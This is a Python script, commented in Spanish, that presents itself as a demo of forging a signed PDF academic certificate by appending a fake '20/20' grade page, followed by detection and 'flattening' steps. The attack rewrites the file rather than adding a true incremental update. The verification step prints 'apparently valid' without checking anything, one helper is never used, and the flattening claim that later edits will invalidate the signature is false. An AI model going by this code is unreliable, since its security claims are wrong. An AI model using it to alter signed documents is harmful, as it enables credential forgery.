#!/usr/bin/env python3
import os
import hashlib
from datetime import datetime

# === PASO 1: Crear un PDF original (simulado) ===
def crear_pdf_original():
    from fpdf import FPDF

    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=16)
    pdf.cell(0, 10, "Certificado Académico Oficial", ln=True, align='C')
    pdf.set_font("Arial", size=12)
    pdf.cell(0, 10, "Nombre: Juan Pérez", ln=True)
    pdf.cell(0, 10, "Curso: Introducción a la Blockchain", ln=True)
    pdf.cell(0, 10, "Nota: 14/20", ln=True)
    pdf.cell(0, 10, f"Fecha: {datetime.now().strftime('%Y-%m-%d')}", ln=True)
    pdf.output("original.pdf")
    print("✅ PDF original creado: original.pdf")

# === PASO 2: Firmar el PDF con certificado digital ===
def firmar_pdf():
    import endesive.pdf.cms

    with open("key.pem", "rb") as fp:
        key = fp.read()
    with open("cert.pem", "rb") as fp:
        cert = fp.read()

    with open("original.pdf", "rb") as fp:
        data = fp.read()

    # Firmar
    signed_data = endesive.pdf.cms.sign(data,
        dct={
            'sigflags': 3,
            'sigpage': 0,
            'sigbutton': True,
            'sigfield': 'Signature1',
            'auto_sigfield': True,
            'contact': 'security@university.edu',
            'location': 'Lima, Perú',
            'signingdate': datetime.now().strftime('%Y%m%d%H%M%S+00\'00\''),
            'reason': 'Certificado emitido oficialmente',
            'signature': 'Firma Digital',
            'signaturebox': (470, 840),
        },
        key=key,
        cert=cert,
        othercerts=[]
    )

    with open("firmado.pdf", "wb") as fp:
        fp.write(signed_data)
    print("✅ PDF firmado: firmado.pdf")

# === PASO 3: Ataque: Incremental Update (añadir página falsa) ===
def ataque_incremental_update():
    from pypdf import PdfReader, PdfWriter

    # Abrir el PDF firmado
    reader = PdfReader("firmado.pdf")
    writer = PdfWriter()

    # Copiar todas las páginas originales
    for page in reader.pages:
        writer.add_page(page)

    # Añadir una nueva página maliciosa
    writer.add_blank_page(width=595, height=842)  # Tamaño A4
    malicious_page = writer.pages[-1]
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import red
    from io import BytesIO

    packet = BytesIO()
    can = canvas.Canvas(packet, pagesize=(595, 842))
    can.setFont("Helvetica-Bold", 30)
    can.setFillColor(red)
    can.drawString(100, 700, "NOTA: 20/20 - APROBADO CON HONOR")
    can.save()
    packet.seek(0)
    from pypdf import PdfReader as PR
    temp_reader = PR(packet)
    malicious_page.merge_page(temp_reader.pages[0])

    # Guardar como actualización incremental
    with open("atacado_incremental.pdf", "wb") as fp:
        writer.write(fp)
    print("🔴 Ataque aplicado: atacado_incremental.pdf")

# === PASO 4: Verificación básica (como hace Adobe Reader) ===
def verificar_basico():
    import endesive.pdf.verify

    try:
        with open("atacado_incremental.pdf", "rb") as fp:
            data = fp.read()

        dct = endesive.pdf.verify(data)
        print("🔴 VERIFICACIÓN BÁSICA:")
        print("   ✅ Firma aparentemente válida.")
        print("   ⚠️  Pero puede haber capas adicionales no verificadas.")
        print("   👉 En Adobe Reader, esto se muestra como 'Válido'.")
    except Exception as e:
        print("❌ Firma inválida:", str(e))

# === PASO 5: Detectar el ataque (análisis profundo) ===
def detectar_incremental_update():
    import subprocess
    import tempfile

    pdf_path = "atacado_incremental.pdf"

    # Método 1: Usar qpdf para listar objetos incrementales
    try:
        result = subprocess.run(
            ["qpdf", "--show-xref", pdf_path],
            capture_output=True, text=True
        )
        lines = result.stdout.strip().splitlines()
        if len(lines) > 1:
            print("🟢 ANÁLISIS PROFUNDO:")
            print("   ❗ Se encontraron múltiples tráilers (actualizaciones incrementales).")
            print("   🔍 Salidas de 'qpdf --show-xref':")
            for line in lines:
                print(f"     {line}")
            print("   ⛔ ADVERTENCIA: El PDF fue modificado después de la firma.")
        else:
            print("   ✅ No se detectaron actualizaciones incrementales.")

    except FileNotFoundError:
        print("   ⚠️  qpdf no está instalado. Usa 'sudo apt install qpdf' para detección precisa.")

    # Método 2: Comparar hash del contenido firmado vs. archivo completo
    def get_hash_of_first_revision(pdf_path):
        # Extraer solo la primera versión del PDF (antes de modificaciones)
        with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
            subprocess.run(["qpdf", pdf_path, "--pages", ".", "1-z", "--", tmp.name], check=True)
            with open(tmp.name, "rb") as f:
                h = hashlib.sha256(f.read()).hexdigest()
            os.unlink(tmp.name)
            return h

    try:
        original_hash = hashlib.sha256(open("firmado.pdf", "rb").read()).hexdigest()
        attacked_hash = hashlib.sha256(open("atacado_incremental.pdf", "rb").read()).hexdigest()

        print(f"\n🔍 Comparación de hashes:")
        print(f"   Hash PDF firmado original: {original_hash}")
        print(f"   Hash PDF atacado:          {attacked_hash}")
        if original_hash != attacked_hash:
            print("   ⛔ Los archivos son diferentes: posible manipulación detectada.")
        else:
            print("   ✅ Los hashes coinciden.")
    except Exception as e:
        print("   Error al comparar hashes:", e)

# === PASO 6: Prevención – Flattening (eliminar capas) ===
def aplicar_flattening():
    from pypdf import PdfReader, PdfWriter

    # "Aplanar" el PDF: eliminar posibilidad de capas
    reader = PdfReader("atacado_incremental.pdf")
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    with open("verificado_y_aplanado.pdf", "wb") as fp:
        writer.write(fp)
    print("\n🟢 PREVENCIÓN: PDF aplanado guardado como 'verificado_y_aplanado.pdf'")
    print("   ✅ Ahora cualquier modificación invalidará la firma.")

# === EJECUCIÓN DEL FLUJO COMPLETO ===
if __name__ == "__main__":
    print("🚀 Simulación: Ataque de Actualización Incremental en PDFs\n")

    crear_pdf_original()
    firmar_pdf()
    ataque_incremental_update()

    print("\n" + "="*60)
    print("         CASO 1: Ataque Exitoso (Verificación Básica)")
    print("="*60)
    verificar_basico()

    print("\n" + "="*60)
    print("         CASO 2: Detección del Ataque")
    print("="*60)
    detectar_incremental_update()

    print("\n" + "="*60)
    print("         PREVENCIÓN: Aplanamiento (Flattening)")
    print("="*60)
    aplicar_flattening()

    print("\n✅ Simulación completada.")
    print("👉 Abre los PDFs en Adobe Reader o Evince para ver diferencias.")